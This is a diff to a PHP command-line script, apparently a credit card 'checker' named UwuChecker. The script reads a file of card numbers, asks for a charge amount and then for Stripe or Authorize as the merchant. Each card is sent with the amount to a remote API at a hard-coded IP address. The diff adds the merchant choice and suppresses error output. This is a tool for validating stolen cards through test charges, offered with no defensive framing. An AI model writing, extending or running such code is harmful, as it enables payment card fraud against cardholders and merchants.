@@ -2,8 +2,9 @@
 ini_set("memory_limit", "-1");
 date_default_timezone_set("Asia/Jakarta");
 define("OS", strtolower(PHP_OS));
+error_reporting(0);
 
-require_once('zebra.php');
+require_once('class/zebra.php');
 
 $curl = new Zebra_cURL();
 
@@ -23,15 +24,24 @@ if(empty(file_get_contents($fileakun)))
     print "CC List Tidak Ditemukan..".PHP_EOL;
     goto awal;
 }
-custom:
-echo "Custom Charge ( ex : 1 ) : $";
-$amount = trim(fgets(STDIN));
 
-if($amount < 1)
-{
-    print "Minimal $1.00 ..".PHP_EOL;
-    goto custom;
+echo "List Merchant\n1.Stripe\n2.Authorize\nSelect Merchant : ";
+$opt = trim(fgets(STDIN));
+
+if($opt == "1"){
+    custom:
+    echo "Custom Charge ( ex : 1 ) : $";
+    $amount = trim(fgets(STDIN));
+    if($amount < 1)
+    {
+        print "Minimal $1.00 ..".PHP_EOL;
+        goto custom;
+    }
+    $url = "http://104.248.200.73/api/stripe.php";
+} else {
+    $url = "http://104.248.200.73/api/authorize.php";
 }
+
 print PHP_EOL."Total : ".count(explode("\n", str_replace("\r","",file_get_contents($fileakun))))." CC".PHP_EOL;
 
 $no = 1;
@@ -47,7 +57,7 @@ foreach(explode("\n", str_replace("\r", "", file_get_contents($fileakun))) as $c
 
 $curl->get(array(
  
-    'http://104.248.200.73/api/stripe.php?cc='.$format.'&amount='.$amount,
+    $url.'?cc='.$format.'&amount='.$amount,
  
 ), function($result) {
 
@@ -65,3 +75,5 @@ $curl->get(array(
 });
 
 }
+
+// cd htdocs/Kerjaan/UwuChecker 
